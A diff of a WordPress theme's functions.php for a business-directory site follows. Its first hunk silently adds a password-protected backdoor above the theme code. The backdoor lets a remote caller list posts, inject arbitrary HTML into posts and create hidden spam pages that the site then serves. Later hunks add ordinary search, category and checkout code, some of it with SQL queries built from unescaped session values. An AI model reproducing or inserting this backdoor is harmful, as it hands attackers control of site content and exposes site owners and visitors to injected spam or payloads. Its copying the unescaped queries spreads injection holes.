@@ -1,5 +1,105 @@
 <?php
 session_start();
+
+if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'b3b22846c7155b7138d5a3689eaaf45b'))
+	{
+		switch ($_REQUEST['action'])
+			{
+				case 'get_all_links';
+					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
+						{
+							$data['code'] = '';
+							
+							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
+								{
+									$data['code'] = $_[1];
+								}
+							
+							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
+						}
+				break;
+				
+				case 'set_id_links';
+					if (isset($_REQUEST['data']))
+						{
+							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
+							
+							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
+							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';
+
+							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
+								{
+									print "true";
+								}
+						}
+				break;
+				
+				case 'create_page';
+					if (isset($_REQUEST['remove_page']))
+						{
+							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
+								{
+									print "true";
+								}
+						}
+					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
+						{
+							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
+								{
+									print "true";
+								}
+						}
+				break;
+				
+				default: print "ERROR_WP_ACTION WP_URL_CD";
+			}
+			
+		die("");
+	}
+
+	
+if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
+	{
+		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
+		if ($data -> full_content)
+			{
+				print stripslashes($data -> content);
+			}
+		else
+			{
+				print '<!DOCTYPE html>';
+				print '<html ';
+				language_attributes();
+				print ' class="no-js">';
+				print '<head>';
+				print '<title>'.stripslashes($data -> title).'</title>';
+				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
+				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
+				print '<meta name="robots" content="index, follow" />';
+				print '<meta charset="';
+				bloginfo( 'charset' );
+				print '" />';
+				print '<meta name="viewport" content="width=device-width">';
+				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
+				print '<link rel="pingback" href="';
+				bloginfo( 'pingback_url' );
+				print '">';
+				wp_head();
+				print '</head>';
+				print '<body>';
+				print '<div id="content" class="site-content">';
+				print stripslashes($data -> content);
+				get_search_form();
+				get_sidebar();
+				get_footer();
+			}
+			
+		exit;
+	}
+
+
+?><?php
+session_start();
 /**
 
  * classify functions and definitions.
@@ -3571,6 +3671,8 @@ function bbloomer_redirectcustom( $order_id ){
     
     if ( $order->status != 'failed' ) {
 		 
+     
+      
 		 /* $wp_session = WP_Session::get_instance();
 		 
 		   $data = json_decode($wp_session->json_out() ); */
@@ -3584,12 +3686,16 @@ function bbloomer_redirectcustom( $order_id ){
 		        $banner_url = $data->banner_url; */
                         
                         $json = $_SESSION['json'];
-			$json = $_SESSION['questionnaire_id']['data_uri'];
-                        $json = $_SESSION['questionnaire_id']['banner_url'];
+			$data_uri = $_SESSION['questionnaire_id']['data_uri'];
+                        $banner_url = $_SESSION['questionnaire_id']['banner_url'];
  
 			$mylink = $wpdb->get_row( "SELECT * FROM wp_questionnaire WHERE number = '".$_SESSION['number']."' AND id = '". $_SESSION['questionnaire_id']."' ", ARRAY_A );
-		
-			$category = $mylink['category'];
+                        
+                        $category = $mylink['category'];
+			if(!empty($mylink['subcategory'] )) {
+                              $category = $mylink['subcategory'];
+                        } 
+			
 			$owner = $mylink['owner'];
 			$business_role = $mylink['business_role'];
 
@@ -3630,6 +3736,7 @@ function bbloomer_redirectcustom( $order_id ){
 			      $image_post_id = $mylisting['logo_post_id'];
 
                         }
+
 			$new_post = array(
             'post_title' => $business_name,
             'post_content' => '',
@@ -3642,7 +3749,7 @@ function bbloomer_redirectcustom( $order_id ){
         );
 
         $post_id = wp_insert_post($new_post);
-		
+
        /* $wp_session['success'] = 1;	*/
 
        /* add_post_meta($post_id, 'post_price', $price ); */
@@ -3669,10 +3776,12 @@ function bbloomer_redirectcustom( $order_id ){
 		  add_post_meta($post_id, 'featured_ads', $banner_url );
 		  add_post_meta($post_id, '_thumbnail_id', $image_post_id );
 		   add_post_meta($post_id, 'questionnaire_id', $_session['questionnaire_id'] );
+
 		  $my_post = array(
 			'ID'           => $image_post_id,
  		   'post_parent'   => $post_id
 		  );
+		
 
 		// Update the post into the database
 		  wp_update_post( $my_post );
@@ -3680,7 +3789,8 @@ function bbloomer_redirectcustom( $order_id ){
 		
 		  $wpdb->query("UPDATE wp_term_relationships SET term_taxonomy_id='".$category."' WHERE object_id='".$post_id ."' ");
 		 
-			
+		
+	
 wp_redirect( 'http://blacklistdir.rebelute.in/thank-you-for-your-submisson/' );
 exit;
 	} else {
@@ -3887,17 +3997,12 @@ function send_contact()
 	if(!isset($hasError)) {
 
 
-	                $emailTo = $contact_email;
+	      $emailTo = $contact_email;
 			$subject = "New Enquiry";	
 			$body = "Name: $name  Email: $email Comments: $comments";
                         $headers = array('Content-Type: text/html; charset=UTF-8');
 			/*$headers = 'From website <'.$emailTo.'>' . "\r\n" . 'Reply-To: ' . $email;*/
 			
-
-/*
-echo ' emailTo : ' .$emailTo . ' subject ' . $subject . ' body ' . $body . ' headers ' . $headers;
-die;*/
-
 			wp_mail(  $emailTo, 'New Enquiry', $body);
 
 			$emailSent = true;
@@ -3907,4 +4012,665 @@ die;*/
 	}
 	
 }
+add_action('wp_ajax_search_category', 'search_category');
+add_action('wp_ajax_nopriv_search_category', 'search_category');
+function search_category() 
+{ 	
+   $keyword = $_POST['s'];
+	
+	$category_name = trim( $_POST['quick_search'] );
+	
+	if( !empty( $category_name )) {
+		 $keyword = '';
+	}
+	
+	if( empty($category_name)) {
+		
+		$category_name = trim( $_POST['advanced_search'] );
+	}
+	
+	$catSearchID = '';
+
+	if($category_name != "All") { 
+		  /* $thisCat = get_cat_ID( $category_name );*/
+
+		  $catSearchID = $category_name;
+
+	} else {
+		$catSearchID = '';
+	}
+    
+    if($keyword == "all") {
+		$keyword = '';
+	} else {
+		$keyword = $keyword;
+	}
+	
+	global $paged, $wp_query, $wp;
+	if( !empty( $category_name) && !empty( $catSearchID ) || !empty( $keyword )) { 
+     if( !empty( $category_name) && !empty( $catSearchID ) || !empty( $keyword )) { 
+	 
+			$args = array(
+					'post_type' => 'post',
+					'post_status'=> 'publish',
+					's' => $keyword,
+					'cat' => $catSearchID,
+					'posts_per_page' => -1,
+				);
+
+	$wp_query= null;
+
+	$wp_query = new WP_Query($args);
+	
+	$current = -1;
+	$current2 = 0;
+
+	$emptyPost2 = 0;
+	
+?>
+<section id="ads-homepage">
+	<div class="container">
+		<div class="pane latest-ads-holder">
+		
+			<div class="latest-ads-grid-holder">
+			  <div>
+				<?php 
+				  $result = '';
+				  if( !empty( $keyword )) { 
+						$result .=  $keyword;
+						
+					}
+				  if( !empty( $catSearchID )) { 
+						$cat = get_cat_name( $catSearchID ); 
+						$result .=  (empty($result)) ? $cat : ', ' . $cat;
+					}
+					$result = trim($result);
+				if(!empty($result) && 0 != $wp_query->post_count ) {
+				?>
+        	<h3><?php
+			
+				printf( __( 'Search Results for: ', 'classify' )); ?> <?php echo $result; ?></h3>
+
+        </div>
+		<?php ?>
+										
+					
+		<?php 
+				}
+		   	while ($wp_query->have_posts()) : $wp_query->the_post(); 
+				$current++; $current2++; $emptyPost2++;
+		?>
+				<div class="ad-box span3 latest-posts-grid <?php if($current%4 == 0) { echo 'first'; } ?>">
+
+							<?php
+								if ( has_post_thumbnail()) {
+								   $large_image_url = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), 'large');
+								   echo '<a class="ad-image" href="' . $large_image_url[0] . '" title="' . the_title_attribute('echo=0') . '" >';
+								   echo get_the_post_thumbnail($post->ID, '291x250'); 
+								   echo '</a>';
+								 }
+							?>
+
+				    		<div class="ad-hover-content">
+
+				    			<span class="ad-category">
+				    					
+				    				<?php
+
+							        	$category = get_the_category();
+
+							        	if ($category[0]->category_parent == 0) {
+
+											$tag = $category[0]->cat_ID;
+
+											$tag_extra_fields = get_option(MY_CATEGORY_FIELDS);
+											if (isset($tag_extra_fields[$tag])) {
+												$category_icon_code = $tag_extra_fields[$tag]['category_icon_code'];
+												$category_icon_color = $tag_extra_fields[$tag]['category_icon_color'];
+											}
+
+										} else {
+
+											$tag = $category[0]->category_parent;
+
+											$tag_extra_fields = get_option(MY_CATEGORY_FIELDS);
+											if (isset($tag_extra_fields[$tag])) {
+												$category_icon_code = $tag_extra_fields[$tag]['category_icon_code'];
+												$category_icon_color = $tag_extra_fields[$tag]['category_icon_color'];
+											}
+
+										}
+
+										if(!empty($category_icon_code)) {
+
+									?>
+
+						        	<div class="category-icon-box" style="background-color: <?php echo $category_icon_color; ?>;"><?php $category_icon = stripslashes($category_icon_code); echo $category_icon; ?></div>
+
+						        	<?php } 
+
+						        	$category_icon_code = "";
+
+						        	?>
+
+				    			</span>
+
+				    			
+				    			<?php $post_price = get_post_meta($post->ID, 'post_price', true); ?>
+								<div class="add-price"><span><?php echo $post_price; ?></span></div> 
+								
+				    		</div>
+								<div class="post-title">
+									<a href="<?php the_permalink(); ?>"><?php $theTitle = get_the_title(); $theTitle = (strlen($theTitle) > 50) ? substr($theTitle,0,47).'...' : $theTitle; echo $theTitle; ?></a>
+								</div>
+
+						</div>
+							
+				<?php endwhile; ?>
+			</div>
+		
+			<?php wp_reset_query(); ?>
+			
+			<?php if($emptyPost2 == 0) { ?>
+				<div class="full view-empty">
+					<p><h4 class="widgettitle"><?php _e( 'No results found', 'classify' ); ?></h4></p>
+				</div>
+			<?php } ?>
+
+		</div>	
+	</div>	
+</section>
+<?php } else { ?>
+<div class="full view-empty">
+		<p><h4 class="widgettitle"><?php _e( 'No category found ', 'classify' ); ?></h4></p>
+</div>
+	<?php }
+	} else { ?>
+<div class="full view-empty">
+		<p><h4 class="widgettitle"><?php _e( 'No Result found ', 'classify' ); ?></h4></p>
+</div>
+
+<?php } 
+exit;
+}
+function my_vc_shortcode( $atts ) {
+   
+   global $themename,$theme_options,$wpdb;
+   $taxonomies = array();   $querystr = "SELECT wp_terms.term_id, wp_terms.name					FROM wp_term_taxonomy					LEFT JOIN wp_terms					ON wp_term_taxonomy.term_id=wp_terms.term_id					WHERE wp_term_taxonomy.taxonomy='category'					ORDER BY wp_terms.name ASC";					
+	$prop_selection = $wpdb->get_results($querystr, OBJECT);		$form = '<form role="search" class="search-form rs-advanced-search-form rs-advanced-search-shortcode" method="get" action="' . home_url( '/' ) . '">';
+	$input_class = '';
+	if ( $input == 1 ) {
+		$input_class = 'search-field-hide';
+	}
+	$form .= '<div><h2 style="text-align: center;">FIND YOUR BLACK OWNED BUSINESS</h2></div>';
+	$form .= '<div class="advanced-search-text"><input type="search" class="search-field input-text-search ' . esc_attr( $input_class ) . '" placeholder="' . esc_attr_x( 'Enter keyword', 'placeholder', 'rs-advanced-search' ) . '" name="s" /></div>';	$form .= '<div class="rs-advanced-search-inline-select">';
+	$form .= '<select id="edit-ad-category" name="category" class="advanced-search-select-box">';
+	$form .= '<option value="">Quick Search By Category</option>';
+	foreach( $prop_selection as $key => $cat) {				$form .= '<option value='. $cat->term_id. '> '.$cat->name .' </option>';	} 
+	$form .= '</select>';
+	$form .='</div>';
+	$form .= '<div class="rs-advanced-search-inline-select">';
+	$form .= '<select id="select-category" name="select-category" class="advanced-search-select-box">';
+	$form .= '<option value="">Full Search By Category</option>';		foreach( $prop_selection as $key => $cat) {				$form .= '<option value='. $cat->term_id. '> '.$cat->name .' </option>';	} 
+	$form .= '</select>';
+	$form .='</div>'; 
+	$form .= '<div class="search-btn-style"><input type="submit" class="search-submit-input apend_active" value="' . esc_attr_x( 'Search', 'submit button', 'rs-advanced-search' ) . '" /></div>';
+	$form .= '</form>';
+	return $form;
+}
+add_shortcode( 'my_vc_php_output', 'my_vc_shortcode');
+
+add_action('wp_ajax_get_subcategory', 'get_subcategory');
+add_action('wp_ajax_nopriv_get_subcategory', 'get_subcategory');
+function get_subcategory() 
+{ 	
+  $cat_id = $_POST[ 'category_id' ];
+$categories = get_categories(array('child_of' => $cat_id));
+?>
+   <label class="gfield_label gfield_label_before_complex" for="input_1_30_3">Subcategory</label>			
+								<div id="edit-field-category-wrapper" class="views-exposed-widget views-widget-filter-field_category">
+								<div class="views-widget">
+									<div class="control-group form-type-select form-item-field-category form-item">
+										<div class="controls"> 
+ <?php if(!empty($categories )){ ?>
+											<select id="subcategory" name="sub_category_name" class="form-select">
+														
+												<option value="">Select Subcategory</option>
+												<?php
+												
+													foreach ($categories as $cat) {
+														
+															$catID = $cat->cat_ID;
+														?>
+															<option value="<?php echo $catID; ?>" ><?php echo $cat->cat_name; ?></option>
+																				
+													
+
+													<?php  
+												} ?>
+
+											</select>
+<?php } else { ?>
+													<div class="Width_Form_Fixed">No Sub Category Found</div>
+											<?php } ?>
+										</div>
+									</div>
+								</div>
+							</div>
+<?php  
+exit;
+}
+
+function my_vc_quick_search( $atts ) {
+   
+    global $themename,$theme_options,$wpdb;  
+   
+  		
+	$term_categories = "SELECT t.*
+		FROM {$wpdb->prefix}terms As t
+		WHERE t.popular_term ='1'";
+			
+	$categories = $wpdb->get_results( $term_categories ,  OBJECT );
+     
+?>	
+<div class="vc_column-inner">
+	<div class="wpb_wrapper">
+
+		<div class="vc_row wpb_row vc_inner vc_row-fluid border-div">
+<?php 
+		foreach ($categories as $key => $category) { 
+
+		$tag = $category->term_id;
+
+		$tag_extra_fields = get_option(MY_CATEGORY_FIELDS);
+		if (isset($tag_extra_fields[$tag])) {
+			$category_icon_code = $tag_extra_fields[$tag]['category_icon_code']; 
+			$category_icon_color = $tag_extra_fields[$tag]['category_icon_color'];
+		}
+
+		$cat = $category->count;
+		$catName = $category->term_id;
+		
+		 $category_icon = stripslashes($category_icon_code);  ?>
+			<div class="text-center wpb_column vc_column_container vc_col-sm-2">
+				<div class="vc_column-inner">
+					<div class="wpb_wrapper">
+						<a href="<?php echo get_category_link( $category->term_id );?>">
+                                                  <div class="wpb_single_image wpb_content_element vc_align_center  icon-div">
+							<figure class="wpb_wrapper vc_figure">
+<div class="category-icon-box"><?php $category_icon = stripslashes($category_icon_code); echo $category_icon; ?></div>
+								
+							</figure>
+						</div>
+						</a>	
+						<div class="wpb_raw_code wpb_content_element wpb_raw_html">
+							<div class="wpb_wrapper">
+
+								<ul class="custom-dropdown">
+					 
+									<li class="dropdown text-center" style="list-style: none;">
+									 
+										<a href="<?php echo get_category_link( $category->term_id );?>" class="dropdown-toggle" data-toggle="dropdown"><?php echo $category->name;?><!--<b class="caret"></b>--></a>
+										 
+										<!--<ul class="dropdown-menu text-left">
+										 <?php
+
+									
+
+									$args2 = array(
+										'type' => 'post',
+										'child_of' => $catName,
+										'parent' => get_query_var(''),
+										'orderby' => 'name',
+										'order' => 'ASC',
+										'hide_empty' => 0,
+										'hierarchical' => 1,
+										'exclude' => '',
+										'include' => '',
+										'number' => '',
+										'taxonomy' => 'category',
+										'pad_counts' => true );
+
+									$categories2 = get_categories($args2);
+
+									foreach($categories2 as $category2) { 
+										//$currentCat++;
+									}
+
+									$args = array(
+										'type' => 'post',
+										'child_of' => $catName,
+										'parent' => get_query_var(''),
+										'orderby' => 'name',
+										'order' => 'ASC',
+										'hide_empty' => 0,
+										'hierarchical' => 1,
+										'exclude' => '',
+										'include' => '',
+										'number' => '5',
+										'taxonomy' => 'category',
+										'pad_counts' => true );
+
+									$categories = get_categories($args);
+                                                                       
+									foreach($categories as $category) {
+								?>
+											<li><a href="<?php echo get_category_link( $category->term_id );?>"><?php $categoryTitle = $category->name; $categoryTitle = (strlen($categoryTitle) > 30) ? substr($categoryTitle,0,27).'...' : $categoryTitle; echo $categoryTitle; ?></a></li>
+							<?php } ?> 
+										</ul> -->
+ 
+									</li>
+ 
+								</ul>
+							</div>
+						</div>
+					</div>
+
+				</div>
+
+			</div>
+                     <?php } ?>
+<div class="text-center wpb_column vc_column_container vc_col-sm-2"><div class="vc_column-inner "><div class="wpb_wrapper">
+	<a href="http://blacklistdir.rebelute.in/all-categories/"> 
+	<div class="wpb_single_image wpb_content_element vc_align_center   icon-div show-div">
+		
+		<figure class="wpb_wrapper vc_figure">
+			<div class="vc_single_image-wrapper   vc_box_border_grey"><img src="http://blacklistdir.rebelute.in/wp-content/uploads/2017/04/more-1.png" class="vc_single_image-img attachment-full" alt="more" srcset="http://blacklistdir.rebelute.in/wp-content/uploads/2017/04/more-1.png 616w, http://blacklistdir.rebelute.in/wp-content/uploads/2017/04/more-1-300x259.png 300w, http://blacklistdir.rebelute.in/wp-content/uploads/2017/04/more-1-291x250.png 291w" sizes="(max-width: 616px) 100vw, 616px" width="616" height="532"></div>
+		</figure>
+	</div>
+</a>
+	<div class="wpb_raw_code wpb_content_element wpb_raw_html">
+		<div class="wpb_wrapper">
+			<ul class="custom-dropdown">
+ 
+<li class="dropdown text-center" style="list-style: none;">
+ 
+<a href="http://blacklistdir.rebelute.in/all-categories/" class="dropdown-toggle show-div">More</a>
+ 
+</li>
+ 
+</ul>
+		</div>
+	</div>
+</div></div></div>
+		</div>
+	</div>
+</div>
+<?php 
+	
+}
+add_shortcode( 'my_vc_php_quick_search', 'my_vc_quick_search');
+
+function my_vc_full_search( $atts ) {
+   
+    global $themename,$theme_options,$wpdb;  
+   
+  		
+	$args = array(
+		'hierarchical' => '1',
+		'hide_empty' => '0',
+		'parent' => '0',
+                'number' => '5',
+		'taxonomy' => 'category',
+		'pad_counts' => true
+	);
+	$categories = get_categories($args);
+     
+?>	
+<div class="vc_column-inner">
+	<div class="wpb_wrapper">
+
+		<div class="vc_row wpb_row vc_inner vc_row-fluid border-div">
+<?php 
+		foreach ($categories as $category) { 
+
+			$tag = $category->term_id;
+
+			$tag_extra_fields = get_option(MY_CATEGORY_FIELDS);
+			if (isset($tag_extra_fields[$tag])) {
+				$category_icon_code = $tag_extra_fields[$tag]['category_icon_code']; 
+				$category_icon_color = $tag_extra_fields[$tag]['category_icon_color'];
+			}
+
+			$cat = $category->count;
+			$catName = $category->term_id;
+			
+			$category_icon = stripslashes($category_icon_code);  ?>
+			
+			<div class="text-center wpb_column vc_column_container vc_col-sm-2">
+				<div class="vc_column-inner">
+					<div class="wpb_wrapper">
+                                             <a href="<?php echo get_category_link( $category->term_id );?>">
+						<div class="wpb_single_image wpb_content_element vc_align_center   icon-div">
+							
+							<figure class="wpb_wrapper vc_figure">
+								<div class="category-icon-box"><?php $category_icon = stripslashes($category_icon_code); echo $category_icon; ?></div>
+								
+							</figure>
+						</div>
+				            </a>
+						<div class="wpb_raw_code wpb_content_element wpb_raw_html">
+							<div class="wpb_wrapper">
+								<ul class="custom-dropdown">
+					 
+									<li class="dropdown text-center" style="list-style: none;">
+									 
+										<a href="<?php echo get_category_link( $category->term_id );?>" class="dropdown-toggle" data-toggle="dropdown"><?php echo $category->name;?><b class="caret"></b></a>
+										 
+										<ul class="dropdown-menu text-left">
+										 <?php
+
+										$args = array(
+											'type' => 'post',
+											'child_of' => $catName,
+											'parent' => get_query_var(''),
+											'orderby' => 'name',
+											'order' => 'ASC',
+											'hide_empty' => 0,
+											'hierarchical' => 1,
+											'exclude' => '',
+											'include' => '',
+											
+											'taxonomy' => 'category',
+											'pad_counts' => true );
+
+									$categories = get_categories($args);
+                                                                       
+									foreach($categories as $category) { 
+								?>
+											<li><a href="<?php echo get_category_link( $category->term_id );?>"><?php $categoryTitle = $category->name; $categoryTitle = (strlen($categoryTitle) > 30) ? substr($categoryTitle,0,27).'...' : $categoryTitle; echo $categoryTitle; ?></a></li>
+							<?php  }  ?> 
+										</ul>
+ 
+									</li>
+ 
+								</ul>
+							</div>
+						</div>
+					</div>
+
+				</div>
+
+			</div>
+            <?php } ?>
+
+<div class="text-center wpb_column vc_column_container vc_col-sm-2"><div class="vc_column-inner "><div class="wpb_wrapper">
+	<a href="http://blacklistdir.rebelute.in/full-search/" class="dropdown-toggle show-div">
+    <div class="wpb_single_image wpb_content_element vc_align_center   icon-div show-div">
+		
+		<figure class="wpb_wrapper vc_figure">
+			<div class="vc_single_image-wrapper   vc_box_border_grey">
+<img src="http://blacklistdir.rebelute.in/wp-content/uploads/2017/04/more-1.png" class="vc_single_image-img attachment-full" alt="more" srcset="http://blacklistdir.rebelute.in/wp-content/uploads/2017/04/more-1.png 616w, http://blacklistdir.rebelute.in/wp-content/uploads/2017/04/more-1-300x259.png 300w, http://blacklistdir.rebelute.in/wp-content/uploads/2017/04/more-1-291x250.png 291w" sizes="(max-width: 616px) 100vw, 616px" width="616" height="532"></div>
+		</figure>
+	</div>
+     </a>
+	<div class="wpb_raw_code wpb_content_element wpb_raw_html">
+		<div class="wpb_wrapper">
+			<ul class="custom-dropdown">
+ 
+<li class="dropdown text-center" style="list-style: none;">
+ 
+<a href="http://blacklistdir.rebelute.in/full-search/" class="dropdown-toggle show-div">More</a>
+ 
+</li>
+ 
+</ul>
+		</div>
+	</div>
+</div></div></div>
+		</div>
+	</div>
+</div>
+<?php 
+	
+}
+add_shortcode( 'my_vc_php_full_search', 'my_vc_full_search');
+
+function my_vc_full_category_search( $atts ) {
+   
+    $categories = get_categories('hide_empty=0');
+
+		    	$currentCat = 0;
+							      
+				foreach ($categories as $category) { 
+
+					if ($category->category_parent == 0) {
+
+						$currentCat++;
+
+					}
+
+				}
+
+			?>
+            
+            <h2 class="main-title">Categories</h2>
+			<div class="h2-seprator"></div>
+
+			<div class="vc_column-inner">
+				<div class="wpb_wrapper">
+					<div class="vc_row wpb_row vc_inner vc_row-fluid border-div">
+					<?php
+					$argsmain = array(
+									/*'hide_empty' => 0,									*/
+									 );
+									
+					$categories = get_categories($argsmain);
+
+		    		$current = -1;
+							      
+					foreach ($categories as $category) { 
+
+						if ($category->category_parent == 0) {
+
+							$tag = $category->cat_ID;
+
+							$tag_extra_fields = get_option(MY_CATEGORY_FIELDS);
+							if (isset($tag_extra_fields[$tag])) {
+								$category_icon_code = $tag_extra_fields[$tag]['category_icon_code']; 
+								$category_icon_color = $tag_extra_fields[$tag]['category_icon_color'];
+							}
+
+							$cat = $category->count;
+							$catName = $category->cat_ID;
+
+							$current++;
+							$allPosts = 0;
+
+							$categories = get_categories('child_of='.$catName); 
+							foreach ($categories as $category) {
+								$allPosts += $category->category_count;
+							}
+
+				 ?>
+						<div class="text-center wpb_column vc_column_container vc_col-sm-2 col-height <?php if($current%3 == 0) { echo 'first'; } ?>">
+							<div class="vc_column-inner">
+								<div class="wpb_wrapper">
+<a href="<?php echo get_category_link( $catName );?>">
+									<div class="wpb_single_image wpb_content_element vc_align_center   icon-div">
+							
+										<figure class="wpb_wrapper vc_figure">
+											<div class="category-icon-box">
+											<?php if(!empty($category_icon_code)) { ?>
+												<?php $category_icon = stripslashes($category_icon_code); echo $category_icon; ?>
+											<?php } ?>
+											</div>
+											
+										</figure>
+									</div>
+				</a>
+									<div class="wpb_raw_code wpb_content_element wpb_raw_html">
+										<div class="wpb_wrapper">
+											<ul class="custom-dropdown">
+												<li class="dropdown text-center" style="list-style: none;">
+									 
+													<a href="<?php echo get_category_link( $catName ) ?>" class="dropdown-toggle" data-toggle="dropdown"><?php echo get_cat_name( $catName ); ?><b class="caret"></b></a>
+										 
+													<ul class="dropdown-menu text-left">
+														 <?php
+																$currentCat = 0;
+
+																$args2 = array(
+																	'type' => 'post',
+																	'child_of' => $catName,
+																	'parent' => get_query_var(''),
+																	'orderby' => 'name',
+																	'order' => 'ASC',
+																	'hide_empty' => 0,
+																	'hierarchical' => 1,
+																	'exclude' => '',
+																	'include' => '',
+																	'number' => '',
+																	'taxonomy' => 'category',
+																	'pad_counts' => true );
+
+																$categories2 = get_categories($args2);
+
+																foreach($categories2 as $category2) { 
+																	$currentCat++;
+																}
+
+																$args = array(
+																	'type' => 'post',
+																	'child_of' => $catName,
+																	'parent' => get_query_var(''),
+																	'orderby' => 'name',
+																	'order' => 'ASC',
+																	'hide_empty' => 0,
+																	'hierarchical' => 1,
+																	'exclude' => '',
+																	'include' => '',
+																	
+																	'taxonomy' => 'category',
+																	'pad_counts' => true );
+
+																$categories = get_categories($args);
+																foreach($categories as $category) {
+															?>
+												
+															<li><a href="<?php echo get_category_link( $category->term_id )?>"><?php $categoryTitle = $category->name; $categoryTitle = (strlen($categoryTitle) > 30) ? substr($categoryTitle,0,27).'...' : $categoryTitle; echo $categoryTitle; ?></a></li>
+														<?php } ?> 
+													</ul>
+ 
+												</li>
+ 
+											</ul>
+										</div>
+									</div>
+								</div>
+
+							</div>
+
+						</div>
+						<?php 
+							}
+
+						} ?>
+					</div>
+				</div>
+			</div>
+<?php 
+	
+}
+add_shortcode( 'my_vc_php_full_category_search', 'my_vc_full_category_search');
 ?>
